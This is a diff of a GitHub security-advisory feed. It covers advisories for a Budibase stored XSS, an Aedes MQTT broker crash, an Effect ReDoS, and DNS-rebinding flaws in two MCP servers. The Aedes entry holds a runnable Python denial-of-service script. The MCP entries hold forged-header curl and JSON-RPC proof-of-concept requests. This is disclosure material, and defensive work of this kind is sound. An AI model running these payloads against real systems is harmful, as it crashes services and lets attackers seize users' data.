+<p>Screenshot note: the browser used for automated reproduction is headless, and native <code>alert()</code> dialogs are not captured by page-level screenshots. <code>window.alert</code> was therefore wrapped with a faithful, screenshot-capturable popup that displays exactly the argument the injected script passed to <code>alert()</code>. The execution itself is 100% genuine and unmodified - the payload's <code>onerror</code> handler ran, called <code>alert()</code>, and set <code>window.xssproof</code> on the real Builder <code>window</code> (see the observed values above). The broken-image glyph in the <strong>Preview</strong> pane is the attacker-controlled <code>&lt;img src=x&gt;</code> inserted by the <code>{@html}</code> sink.</p>
+</blockquote>
+<h3 id="impact">Impact</h3>
+<p><strong>Type:</strong> Cross-privilege <strong>Stored / persistent Cross-Site Scripting (XSS)</strong> in the application builder.</p>
+<p><strong>Who is impacted:</strong> any self-hosted (or cloud) Budibase workspace that exposes an external-datasource table for writes to lower-privileged roles - the standard pattern for feedback forms, contact/lead capture, surveys, support tickets, registration, and any "data collection" app. On such apps the writer can be a <code>BASIC</code> app user or, when the write screen is public, an <strong>unauthenticated</strong> visitor.</p>
+<p><strong>What the attacker gains:</strong> the payload executes in the <strong>Builder/admin session</strong>, an origin with <strong>no CSP</strong>. From there the attacker's JavaScript can silently drive every authenticated Builder API in the victim's context, e.g.:</p>
+<ul>
+<li>create a REST/SQL <strong>datasource</strong> or an <strong>automation</strong> step that runs server-side JavaScript / Bash → <strong>remote code execution</strong> on the server;</li>
+<li>read or modify <strong>every table</strong> in the workspace (full data exfiltration / tampering);</li>
+<li><strong>escalate</strong> the attacker's own account (or create a new one) to builder/admin;</li>
+<li>pivot to the underlying CouchDB/MinIO/Redis via server-side automation.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-r2q3-7m4h-63qg">https://github.com/Budibase/budibase/security/advisories/GHSA-r2q3-7m4h-63qg</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-122244">https://nvd.nist.gov/vuln/detail/CVE-2026-122244</a></li>
+<li><a href="https://github.com/Budibase/budibase/commit/5f37fb43728639c540cc7233283f1100e9315424">https://github.com/Budibase/budibase/commit/5f37fb43728639c540cc7233283f1100e9315424</a></li>
+<li><a href="https://github.com/Budibase/budibase/releases/tag/v3.50.0">https://github.com/Budibase/budibase/releases/tag/v3.50.0</a></li>
+<li><a href="https://github.com/Budibase/budibase/releases/tag/v4.0.0">https://github.com/Budibase/budibase/releases/tag/v4.0.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-r2q3-7m4h-63qg">https://github.com/advisories/GHSA-r2q3-7m4h-63qg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-r2q3-7m4h-63qg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-11-20T23:49:47.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[aedes] Aedes has Uncaught Exception and Uncontrolled Resource Consumption]]></title>
+        <id>https://github.com/advisories/GHSA-xxqp-5qx8-gj5q</id>
+        <link href="https://github.com/advisories/GHSA-xxqp-5qx8-gj5q"/>
+        <updated>2026-11-20T23:32:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A remote Denial of Service (DoS) vulnerability, allows any remote client to cause a complete crash of the Aedes MQTT broker process. This is achieved by sending a specially crafted MQTT message (via PUBLISH or SUBSCRIBE), or by setting a Will message with such a topic, containing a highly recursive topic string (e.g., with thousands of '/' delimiters). The lack of input validation and error handling leads to an uncaught exception in an internal routing library, terminating the entire Node.js application.</p>
+<h3 id="details">Details</h3>
+<p>The Aedes broker fails to enforce limits on the depth or structural complexity of MQTT topic strings. When a client publishes to or subscribes to a topic with excessive levels of recursion, the internal routing logic cascading into the qlobber library (via mqemitter) reaches an hard-coded limit within the qlobber._split_words function.</p>
+<p>This function throws a hard Error: too many words (found in lib/qlobber.js:604). Crucially, Aedes does not wrap the calls to these internal modules (such as in handlers/subscribe.js or the publishing logic) in try-catch blocks. Consequently, this exception propagates up to the main Node.js event loop as an unhandled exception, causing the entire broker process to crash immediately.</p>
+<p>This vulnerability affects all stable versions of Aedes due to the underlying dependency behavior and missing perimetral validation.</p>
+<p>Stack Trace from Crash:</p>
+<pre><code class="language-Plaintext">aedes-broker  | /app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:604
+aedes-broker  | 	throw new Error('too many words');
+aedes-broker  | 	^
+aedes-broker  | 
+aedes-broker  | Error: too many words
+aedes-broker  |     at Qlobber._split_words (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:604:15)
+aedes-broker  |     at Qlobber._split (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:624:18)
+aedes-broker  |     at Qlobber.add (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:651:43)
+aedes-broker  |     at MQEmitter.on (/app/node_modules/mqemitter/mqemitter.js:65:17)
+aedes-broker  |     at Aedes.subscribe (/app/node_modules/aedes/aedes.js:289:11)
+aedes-broker  |     at SubState.addSubs (/app/node_modules/aedes/lib/handlers/subscribe.js:167:12)
+</code></pre>
+<p>The same uncaught exception can be triggered without an explicit PUBLISH/SUBSCRIBE: a client that registers a Will message with a deeply nested topic crashes the broker when the Will is published on ungraceful disconnect, because the Will publish path calls broker.publish directly and bypasses the PUBLISH handler.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites</strong></p>
+<ul>
+<li>Aedes MQTT Broker running and accessible over the network. For testing and replication, the broker was deployed using the official Docker image via the following command:</li>
+</ul>
+<pre><code class="language-bash">docker run -d --name aedes-broker -p 1883:1883 moscajs/aedes:latest
+</code></pre>
+<ul>
+<li>Ability to establish an MQTT session (authenticated or unauthenticated, as per the broker's configuration).</li>
+</ul>
+<p><strong>Reproduction Steps</strong></p>
+<ol>
+<li>Save the following Python stress testing script (mqtt_crash_poc.py):</li>
+</ol>
+<pre><code class="language-Python">#!/usr/bin/env python3
+import argparse
+import time
+import paho.mqtt.client as mqtt
+
+def on_connect(client, userdata, flags, reason_code, properties=None):
+    if reason_code != 0:
+        print(f"[-] Error en la conexión: {reason_code}")
+
+def on_disconnect(client, userdata, disconnect_flags, reason_code, properties=None):
+    if reason_code != 0:
+        print(f"[*] -&gt; Desconexión detectada (Caída del bróker). Razón: {reason_code}")
+
+def run_exploit(host, port):
+    # Escenarios de colapso directo (Casos 1.2, 1.3, 2.2, 2.3)
+    payloads = [
+            {"type": "PUB_DEEP", "topic": "a/" * 30000 + "target"},
+            {"type": "PUB_LIMIT", "topic": "a/" * 32766 + "a/b"},
+            {"type": "SUB_WILD", "topic": "+/" * 150 + "#", "pub": "A/" * 150 + "target"},
+            {"type": "SUB_DEEP", "topic": "+/" * 10000 + "#", "pub": "A/" * 10000 + "target"}
+    ]
+        
+    for case in payloads:
+        print(f"\n[*] Lanzando vector de ataque tipo: {case['type']}")
+        client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
+        client.on_connect = on_connect
+        client.on_disconnect = on_disconnect
+            
+        try:
+            client.connect(host, port, keepalive=60)
+            client.loop_start()
+            time.sleep(1)
+                
+            if "PUB" in case['type']:
+                client.publish(case['topic'], payload="DoS_Attack", qos=0)
+            else:
+                client.subscribe(case['topic'], qos=0)
+                time.sleep(1)
+                client.publish(case['pub'], payload="DoS_Attack", qos=0)
+                    
+            time.sleep(2)
+        except Exception as e:
+            print(f"[-] Error durante el envío: {e}")
+        finally:
+            client.loop_stop()
+            client.disconnect()
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-d", "--direccion", required=True, help="IP del broker")
+    parser.add_argument("-p", "--puerto", type=int, default=1883, help="Puerto")
+    args = parser.parse_args()
+    run_exploit(args.direccion, args.puerto)
+</code></pre>
+<ol start="2">
+<li>Run the script against the target broker:python3 mqtt_crash_poc.py -d  -p 1883</li>
+<li>Upon execution, the Aedes broker dies instantly on the very first packet (PUB_DEEP). Checking the container logs will reveal the stack trace provided in the Details section, confirming the Error: too many words exception.</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>This is a Remote Denial of Service (DoS) vulnerability. It affects any infrastructure running an unpatched Aedes MQTT Broker. A successful attack terminates the service entirely, disconnecting all legitimate clients (IoT devices, applications, users) and preventing reconnection until the process is manually or automatically restarted, causing severe business and operational interruption.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/moscajs/aedes/security/advisories/GHSA-xxqp-5qx8-gj5q">https://github.com/moscajs/aedes/security/advisories/GHSA-xxqp-5qx8-gj5q</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63341">https://nvd.nist.gov/vuln/detail/CVE-2026-63341</a></li>
+<li><a href="https://github.com/moscajs/aedes/commit/b9024faa4cb416c4c6980760b4d7f55336315f2d">https://github.com/moscajs/aedes/commit/b9024faa4cb416c4c6980760b4d7f55336315f2d</a></li>
+<li><a href="https://github.com/moscajs/aedes/releases/tag/v1.1.1">https://github.com/moscajs/aedes/releases/tag/v1.1.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-xxqp-5qx8-gj5q">https://github.com/advisories/GHSA-xxqp-5qx8-gj5q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xxqp-5qx8-gj5q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-11-20T23:32:35.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[storyblok-backup] storyblok-backup: Stored path traversal via unsanitized Storyblok component names in backup output]]></title>
         <id>https://github.com/advisories/GHSA-vcx7-pfrh-mcfg</id>
@@ -1067,236 +1576,5 @@ xOnlyPointAddTweakCheck(point, tweak, point) === true
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-11-19T22:17:05.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[effect] Effect: ReDoS in Schema.TemplateLiteral compiled regex]]></title>
-        <id>https://github.com/advisories/GHSA-7589-6fvf-x4pw</id>
-        <link href="https://github.com/advisories/GHSA-7589-6fvf-x4pw"/>
-        <updated>2026-11-19T20:51:02.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p><code>Schema.TemplateLiteral</code> compiles each <code>Schema.String</code> span to the lazy wildcard <code>[\s\S]*?</code> and decodes input by running the resulting regular expression against it. When a template has two or more <code>Schema.String</code> spans, for example:</p>
-<pre><code class="language-ts">Schema.TemplateLiteral(Schema.String, ":", Schema.String, ":", Schema.String, "X")
-</code></pre>
-<p>the regex contains several ambiguous wildcards. A non-matching input makes the backtracking engine try combinations across all of them, so matching time grows cubically with input length. A 5,000-character string of <code>:</code> characters blocks the event loop for about 15 seconds.</p>
-<p>Applications that decode untrusted input with such a schema are affected. That includes <code>Schema.decodeUnknown</code>, <code>Schema.decodeUnknownSync</code> and <code>Schema.is</code>, and anything built on them, such as <code>HttpApi</code> request payloads and <code>@effect/rpc</code> payloads.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in <code>effect@3.22.1</code> (#6761). Template literals whose spans are all <code>Schema.String</code> are now matched with a linear left-to-right scan instead of a regular expression.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you can't upgrade, check the input length before the template literal runs. Adding <code>Schema.maxLength</code> with <code>.pipe</code> doesn't help, because the filter runs after the regex. Put the length check on the input side instead:</p>
-<pre><code class="language-ts">Schema.compose(Schema.String.pipe(Schema.maxLength(256)), MyTemplateLiteral)
-</code></pre>
-<p>Rejecting oversized request bodies before they reach the schema also works.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Effect-TS/effect/security/advisories/GHSA-7589-6fvf-x4pw">https://github.com/Effect-TS/effect/security/advisories/GHSA-7589-6fvf-x4pw</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-121707">https://nvd.nist.gov/vuln/detail/CVE-2026-121707</a></li>
-<li><a href="https://github.com/Effect-TS/effect/pull/6761">https://github.com/Effect-TS/effect/pull/6761</a></li>
-<li><a href="https://github.com/Effect-TS/effect/commit/3cc3c6e1a64cbdc360e9d28e44f3ec3ce0ece6e3">https://github.com/Effect-TS/effect/commit/3cc3c6e1a64cbdc360e9d28e44f3ec3ce0ece6e3</a></li>
-<li><a href="https://github.com/Effect-TS/effect/releases/tag/effect@3.22.1">https://github.com/Effect-TS/effect/releases/tag/effect@3.22.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-7589-6fvf-x4pw">https://github.com/advisories/GHSA-7589-6fvf-x4pw</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7589-6fvf-x4pw</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-19T20:51:01.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[obsidian-sync-mcp] obsidian-sync-mcp: Missing Host/Origin validation lets a public website drive a victim's Obsidian vault via DNS rebinding (no-auth mode)]]></title>
-        <id>https://github.com/advisories/GHSA-mx6p-3fg7-v6pj</id>
-        <link href="https://github.com/advisories/GHSA-mx6p-3fg7-v6pj"/>
-        <updated>2026-11-19T20:41:20.000Z</updated>
-        <content type="html"><![CDATA[<p>When obsidian-sync-mcp runs without MCP_AUTH_TOKEN (the documented no-auth mode for local use), the HTTP MCP endpoint does not validate the Host or Origin header before dispatching MCP methods (CWE-350). The no-auth mode's "local network only" assumption therefore does not hold: a malicious web page the operator visits can use DNS rebinding to resolve an attacker-controlled hostname to 127.0.0.1 (or the operator's LAN/VPN/Docker-published address) and issue requests the server accepts as trusted local calls, reaching the full tool surface (read_note, write_note, edit_note, delete_note, move_note, list_notes, list_folders, list_tags, get_note_metadata).</p>
-<p>Affected versions: &lt;= 0.5.6
-Patched version: 0.5.7</p>
-<h2 id="impact">Impact</h2>
-<p>Any deployment running without MCP_AUTH_TOKEN — including the README "Filesystem mode (simplest)" quickstart and the self-hosted docker-compose setup (where MCP_AUTH_TOKEN defaults to empty)" — is exposed to any website the operator visits while the server is running. That page's JavaScript can silently read the entire vault and create/overwrite/delete/move notes, with no credentials and no prompt. In CouchDB/Self-hosted LiveSync mode, the same code path applies, so vault content in CouchDB is equally reachable. Deployments that set MCP_AUTH_TOKEN are not affected — a bearer token is not attached by browsers, so a forged request returns HTTP 401.</p>
-<h2 id="remediation">Remediation</h2>
-<p>Upgrade to 0.5.7, which validates both the Host and Origin headers in no-auth mode: any request whose Host is not localhost/127.0.0.1/::1 (or a value in the new MCP_ALLOWED_HOSTS), or that carries a cross-origin Origin not in that allowlist, is rejected before any MCP method runs. The Host check defeats DNS rebinding; the Origin check defeats the related bypass where a page directly fetches <a href="http://127.0.0.1">http://127.0.0.1</a>:/mcp (genuine loopback Host, attacker Origin) — the transport's wildcard CORS would otherwise expose the response. Non-browser MCP clients send no Origin, so they are unaffected. These checks block browser-delivered attacks only; a direct non-browser network client can still forge both headers, so on untrusted networks set MCP_AUTH_TOKEN.</p>
-<p>Workaround (any version): set MCP_AUTH_TOKEN to require authentication — this closes the path immediately.</p>
-<h2 id="technical-detail">Technical detail</h2>
-<p>In no-auth mode serverOptions.authenticate was never installed, so FastMCP dispatched every request with no per-request check. Even with a token, only the Authorization header was inspected — nothing in the server, fastmcp, or mcp-proxy validated Host/Origin. Two browser-reachable variants follow: (1) classic DNS rebinding, where the browser sends the attacker's hostname in Host; and (2) a direct cross-origin fetch() to the loopback address, where Host is genuinely 127.0.0.1 but Origin is attacker-controlled and the transport's wildcard Access-Control-Allow-Origin: * exposes the response — no rebinding required. The 0.5.7 fix adds an application-layer Host+Origin check in authenticate that rejects such requests before dispatch; it is a compensating control and does not alter the wildcard CORS header itself (the rejection happens before any response body is produced).</p>
-<h2 id="proof-of-concept-mitigated-in-057">Proof of concept (mitigated in 0.5.7)</h2>
-<pre><code># No-auth server (per the README quickstart)
-VAULT_PATH=/tmp/demo-vault HOST=127.0.0.1 PORT=8787 npx tsx src/main.ts
-
-# Forged Host/Origin (what a DNS-rebinding page's fetch() sends) reaches the tools with no credential:
-curl -s -i http://127.0.0.1:8787/mcp \
-  -H "Host: attacker.example" -H "Origin: http://attacker.example" \
-  -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \
-  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"poc","version":"1.0"}}}'
-# -&gt; HTTP 200; a follow-up tools/call to write_note creates a file in the vault, no Authorization header.
-# The same sequence against a server with MCP_AUTH_TOKEN set returns HTTP 401.
-</code></pre>
-<pre><code># Variant 2 — no rebinding needed: real loopback Host, attacker Origin.
-# In &lt;= 0.5.6 this returns 200 and executes tools; in 0.5.7 it returns 403.
-curl -s -i http://127.0.0.1:8787/mcp \
-  -H "Host: 127.0.0.1:8787" -H "Origin: http://attacker.example" \
-  -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \
-  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"poc","version":"1.0"}}}'
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/es617/obsidian-sync-mcp/security/advisories/GHSA-mx6p-3fg7-v6pj">https://github.com/es617/obsidian-sync-mcp/security/advisories/GHSA-mx6p-3fg7-v6pj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-77283">https://nvd.nist.gov/vuln/detail/CVE-2026-77283</a></li>
-<li><a href="https://github.com/es617/obsidian-sync-mcp/commit/d4d2cbbb02ffadaecf1d6252902b8d08610c7018">https://github.com/es617/obsidian-sync-mcp/commit/d4d2cbbb02ffadaecf1d6252902b8d08610c7018</a></li>
-<li><a href="https://github.com/es617/obsidian-sync-mcp/releases/tag/v0.5.7">https://github.com/es617/obsidian-sync-mcp/releases/tag/v0.5.7</a></li>
-<li><a href="https://github.com/advisories/GHSA-mx6p-3fg7-v6pj">https://github.com/advisories/GHSA-mx6p-3fg7-v6pj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mx6p-3fg7-v6pj</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-19T20:41:18.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@doist/todoist-mcp] Todoist MCP Server: Browser DNS rebinding lets websites write and delete Todoist data through local MCP server]]></title>
-        <id>https://github.com/advisories/GHSA-833v-v58w-294h</id>
-        <link href="https://github.com/advisories/GHSA-833v-v58w-294h"/>
-        <updated>2026-11-19T20:38:36.000Z</updated>
-        <content type="html"><![CDATA[<p>The self-hosted <code>todoist-mcp-http</code> server accepts browser-origin MCP requests with attacker-controlled <code>Host</code> and <code>Origin</code> headers. A malicious website can use DNS rebinding to route its own origin to a victim's local <code>127.0.0.1</code> MCP server, then invoke Todoist MCP tools without a caller credential.</p>
-<p>This affects <code>github.com/Doist/todoist-mcp</code> at commit <code>d2903e0d945d2a559d71c091337ad6380511e62f</code>, package version <code>10.3.1</code>, when the optional Streamable HTTP server is running. The stdio entrypoint is not browser-reachable. The vulnerable browser-reachable component is <code>todoist-mcp-http</code>.</p>
-<p>The documented HTTP server mode runs all MCP tools with the operator's <code>TODOIST_API_KEY</code> and binds to loopback by default:</p>
-<pre><code class="language-bash">TODOIST_API_KEY=your-key npx -p @doist/todoist-mcp todoist-mcp-http
-</code></pre>
-<p><code>src/main-http.ts:28-30</code> sets the HTTP bind host and port:</p>
-<pre><code class="language-ts">const PORT = Number.parseInt(process.env.PORT || '3000', 10)
-const HOST = process.env.HOST || '127.0.0.1'
-const LISTEN_HOST = normalizeListenHost(HOST)
-</code></pre>
-<p><code>src/main-http.ts:88-99</code> dispatches <code>POST /mcp</code> to <code>StreamableHTTPServerTransport</code> without validating <code>Host</code> or <code>Origin</code>:</p>
-<pre><code class="language-ts">app.post(
-    '/mcp',
-    requireValidTodoistToken({ type: 'static', apiKey: todoistApiKey, baseUrl }),
-    async (req: Request, res: Response) =&gt; {
-        const transport = new StreamableHTTPServerTransport({
-            sessionIdGenerator: undefined,
-        })
-
-        const server = getMcpServer({ todoistApiKey, baseUrl })
-        await server.connect(transport)
-        await transport.handleRequest(req, res, req.body)
-    },
-)
-</code></pre>
-<p><code>src/middleware/require-valid-todoist-token.ts:105-117</code> validates the configured server-side Todoist token and then forwards the request. It does not authenticate the browser caller:</p>
-<pre><code class="language-ts">const valid = await getValidation()
-
-if (valid) {
-    next()
-    return
-}
-</code></pre>
-<p><code>src/mcp-server.ts:215-285</code> registers Todoist read and write tools against the server-side Todoist API client, including <code>add-tasks</code>, <code>complete-tasks</code>, <code>update-tasks</code>, <code>delete-object</code>, comments, reminders, labels, filters, goals, and assignments.</p>
-<h2 id="proof-of-concept">Proof of concept</h2>
-<p>Start the upstream local HTTP server with an operator-owned Todoist test account:</p>
-<pre><code class="language-bash">git clone https://github.com/Doist/todoist-mcp.git
-cd todoist-mcp
-git checkout d2903e0d945d2a559d71c091337ad6380511e62f
-npm ci --ignore-scripts
-npm run build
-
-export TODOIST_API_KEY='&lt;Todoist test account API token&gt;'
-PORT=8082 HOST=127.0.0.1 node dist/main-http.js
-</code></pre>
-<p>The server prints:</p>
-<pre><code class="language-text">Todoist MCP HTTP Server started on 127.0.0.1:8082
-MCP endpoint: http://127.0.0.1:8082/mcp
-</code></pre>
-<p>From a browser page using DNS rebinding, route the attacker origin to <code>127.0.0.1:8082</code> and send MCP JSON-RPC requests to <code>POST /mcp</code>.</p>
-<p>First enumerate tools. The rebound browser session can list Todoist write tools such as <code>add-tasks</code> and <code>complete-tasks</code>.</p>
-<p>Call <code>user-info</code>:</p>
-<pre><code class="language-json">{
-  "jsonrpc": "2.0",
-  "id": 3,
-  "method": "tools/call",
-  "params": {
-    "name": "user-info",
-    "arguments": {}
-  }
-}
-</code></pre>
-<p>Observed result: the response returns the Todoist account tied to the server-held <code>TODOIST_API_KEY</code>.</p>
-<p>Create a disposable task:</p>
-<pre><code class="language-json">{
-  "jsonrpc": "2.0",
-  "id": 4,
-  "method": "tools/call",
-  "params": {
-    "name": "add-tasks",
-    "arguments": {
-      "tasks": [
-        {
-          "content": "DNS REBINDING DEMO - attacker-created task",
-          "description": "Created through browser-origin DNS rebinding against local todoist-mcp-http.",
-          "priority": "p1",
-          "dueString": "today"
-        }
-      ]
-    }
-  }
-}
-</code></pre>
-<p>Observed result: Todoist creates the task and the MCP response returns the new task ID.</p>
-<p>Complete the same task:</p>
-<pre><code class="language-json">{
-  "jsonrpc": "2.0",
-  "id": 5,
-  "method": "tools/call",
-  "params": {
-    "name": "complete-tasks",
-    "arguments": {
-      "ids": [
-        "&lt;RETURNED_TASK_ID&gt;"
-      ]
-    }
-  }
-}
-</code></pre>
-<p>Observed result: the MCP response returns <code>successCount: 1</code>, and the Todoist UI shows the same task completed.</p>
-<p><a href="https://drive.google.com/file/d/1zfgYQS-vbi1zc8N2JayShtwBCZbN-doG/view">demo video</a></p>
-<h2 id="impact">Impact</h2>
-<p>A public website can operate a victim's local <code>todoist-mcp-http</code> server when the optional HTTP transport is running. The browser does not supply a Todoist API token. The MCP server supplies its configured <code>TODOIST_API_KEY</code>.</p>
-<p>The demonstrated impact is Todoist task creation and completion. The same browser-origin path exposes the rest of the registered Todoist write surface, including task updates, task rescheduling, project and section changes, comments, reminders, filters, labels, goals, assignments, and object deletion.</p>
-<p>This violates the browser-origin boundary. A user can run the MCP server only on loopback and still become reachable from an unrelated public website because DNS rebinding preserves the attacker's <code>Host</code> and <code>Origin</code> while routing the TCP connection to <code>127.0.0.1</code>.</p>
-<h2 id="why-this-is-a-vulnerability">Why this is a vulnerability</h2>
-<ul>
-<li>The default HTTP bind target is loopback, which users reasonably treat as local-only.</li>
-<li>DNS rebinding makes loopback HTTP reachable from a public website unless the server validates <code>Host</code> and <code>Origin</code>.</li>
-<li>The MCP route does not require a per-request caller secret.</li>
-<li>The middleware validates the server's Todoist backend token, not the browser caller.</li>
-<li>Tool execution uses the server-held <code>TODOIST_API_KEY</code> to mutate Todoist state.</li>
-</ul>
-<h2 id="remediation">Remediation</h2>
-<p>Add strict <code>Host</code> validation before MCP dispatch. For local deployments, accept only explicit loopback hostnames such as <code>127.0.0.1</code>, <code>localhost</code>, <code>[::1]</code>, and any operator-configured trusted names.</p>
-<p>Reject browser requests with missing or untrusted <code>Origin</code> values before they reach <code>StreamableHTTPServerTransport</code>.</p>
-<p>Require a per-run local bearer token or equivalent caller secret for HTTP MCP mode, including loopback deployments. Host and Origin validation reduce DNS-rebinding exposure, but they are not caller authentication.</p>
-<p>Enable DNS rebinding protection in the MCP SDK HTTP transport if available, and pass explicit allowed host and origin lists. Keep stdio as the safest default local transport.</p>
-<h2 id="reporter">Reporter</h2>
-<p>Avishai Gonen - Pluto Security</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Doist/todoist-mcp/security/advisories/GHSA-833v-v58w-294h">https://github.com/Doist/todoist-mcp/security/advisories/GHSA-833v-v58w-294h</a></li>
-<li><a href="https://github.com/todoist/todoist-mcp/security/advisories/GHSA-833v-v58w-294h">https://github.com/todoist/todoist-mcp/security/advisories/GHSA-833v-v58w-294h</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-76807">https://nvd.nist.gov/vuln/detail/CVE-2026-76807</a></li>
-<li><a href="https://github.com/todoist/todoist-mcp/pull/516">https://github.com/todoist/todoist-mcp/pull/516</a></li>
-<li><a href="https://github.com/todoist/todoist-mcp/commit/245bf29cf5dbd8272e2aa896ad38557f91f8a16a">https://github.com/todoist/todoist-mcp/commit/245bf29cf5dbd8272e2aa896ad38557f91f8a16a</a></li>
-<li><a href="https://github.com/todoist/todoist-mcp/releases/tag/v10.3.3">https://github.com/todoist/todoist-mcp/releases/tag/v10.3.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-833v-v58w-294h">https://github.com/advisories/GHSA-833v-v58w-294h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-833v-v58w-294h</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-11-19T20:38:35.000Z</published>
     </entry>
 </feed>
